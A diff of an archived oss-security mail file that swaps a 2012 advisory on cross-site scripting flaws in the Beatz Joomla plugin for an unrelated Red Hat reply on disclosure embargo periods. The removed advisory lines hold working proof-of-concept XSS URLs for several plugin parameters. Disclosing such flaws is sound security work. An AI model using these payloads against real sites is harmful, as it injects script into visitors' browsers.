@@ -1,82 +1,64 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/15/4
-Message-ID: <CAPYM6Vxx-1nvBsVLqTZPsqDevfXkiR30-1H=+96ko0w4gGczLA@mail.gmail.com>
-Date: Mon, 16 Apr 2012 00:39:16 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
-Subject: Joomla! Plugin - Beatz 1.x <= Multiple Cross Site Scripting Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/02/1
+Message-ID: <4F29D7FC.4040209@redhat.com>
+Date: Wed, 01 Feb 2012 17:25:32 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: Solar Designer <solar@...nwall.com>
+Subject: Re: distros & linux-distros embargo period and message format
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+On 02/01/2012 04:54 PM, Solar Designer wrote:
+> Why shorter embargo periods are preferable: vendors who are ready to
+> push out their updates first don't have to sit on those updates waiting
+> for others, users get their fixes sooner, the potential for leaks (or
+> rediscovery) and exploit development in the wild before a fix is out is
+> reduced, the potential for a vendor inadvertently releasing before the
+> CRD is reduced (and in case this happens anyway, other vendors are
+> likely "more ready" by that time since they knew the CRD was sooner),
+> fewer embargoed issues are being tracked at the same time (less work,
+> lower risk of errors).
+>
+> Of course, this is a tradeoff - just like the very existence of such
+> closed lists is.
 
-Beatz 1.x versions are vulnerable to Cross Site Scripting.
+Against the certainty that the end of the embargo brings, so we're
+putting a potential risk (rediscovery/etc.) against a guarented risk
+(details will become available when the embargo ends. I'm not claiming
+to know which is better but I think two weeks is already pretty short,
+reducing that to say a week only saves 7 days but potentially increases
+workload 100% or more (we have half as much time to deal with it).
 
+> Why me: I feel that it's my duty as list admin to propose the smallest
+> maximum embargo period that list members might be willing and able to use.
 
-2. BACKGROUND
+I think the shortened embargo time is rapidly approaching the limit of
+maximum benefit (that is balancing time to fix against the chance of it
+becoming public and putting systems/people at risk). Personally I think
+hard rules are not a good idea here, I would support guidelines that
+have some flexibility, not all cases are the same.
 
-Beatz is a set of powerful Social Networking Script Joomla! 1.5
-plugins that allows you to start your own favourite artist band
-website. Although it is just a Joomla! plugin, it comes with full
-Joolma! bundle for ease of use and installation.
+> I already provided some answers to "why" above, and here's one more: the
+> change may also result in vendors' processes being adjusted to meet the
+> faster pace.  I am unsure to which extent this is positive overall,
+> though (considering that those changes may have side-effects).
 
+I don't have the data handy but I know most Linux vendors are now
+responding to 500-1000 security issues per year and getting the majority
+of them fixed by the time the issue goes public or very shortly
+thereafter, I'm not sure we can speed this up much (this works tends to
+be highly serialized, find the bug, assess the bug, fix the bug, QA the
+software, etc.).
 
-3. VULNERABILITY DESCRIPTION
-
-Multiple parameters were not properly sanitized upon submission, which
-allows attacker to conduct Cross Site Scripting attack. This may allow
-an attacker to create a specially crafted URL that would execute
-arbitrary script code in a victim's browser. The vulnerable plugins
-include: com_find, com_charts and com_videos.
-
-
-4. VERSIONS AFFECTED
-
-Tested in 1.x versions
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-== Generic Joomla! 1.5 Double Encoding XSS
-
-http://localhost/beatz/?option=com_content&view=frontpage&limitstart=5&%2522%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2f%2558%2553%2553%2f%2529%253c%2f%2573%2563%2572%2569%2570%2574%253e=1
-
-== com_charts (parameter: do)
-
-http://localhost/beatz/index.php?option=com_charts&view=charts&Itemid=76&chartkeyword=Acoustic&do=all%22%20style%3dbackground-image:url('javascript:alert(/XSS/)');width:1000px;height:1000px;display:block;"%20x=%22&option=com_charts
-
-== com_find (parameter: keyword)
-
-http://localhost/beatz/index.php?do=listAll&keyword=++Search"><img+src=0+onerror=prompt(/XSS/)>&option=com_find
-
-== com_videos (parameter: video_keyword)
-
-http://localhost/beatz/index.php?option=com_videos&view=videos&Itemid=59&video_keyword="+style="width:1000px;height:1000px;position:absolute;left:0;top:0"+onmouseover="alert(/xss/)&search=Search
-
-
-6. SOLUTION
-
-The vendor hasn't released the fixed yet.
+Also I haven't really seen any cases in the open source world of a leak
+of information leading to widespread exploitation/problems (and if there
+have been I'd love to know).
 
 
-7. VENDOR
-
-Cogzidel Technologies Pvt Ltd.
-http://www.cogzidel.com/
-
-
-8. CREDIT
-
-Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+> Thanks again,
+> 
+> Alexander
 
 
-9. DISCLOSURE TIME-LINE
-
-2011-03-01: notified vendor
-2012-04-15: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL: http://yehg.net/lab/pr0js/advisories/%5Bbeatz_1.x%5D_xss
-
-#yehg [2012-04-15]
+-- 
+Kurt Seifried Red Hat Security Response Team (SRT)
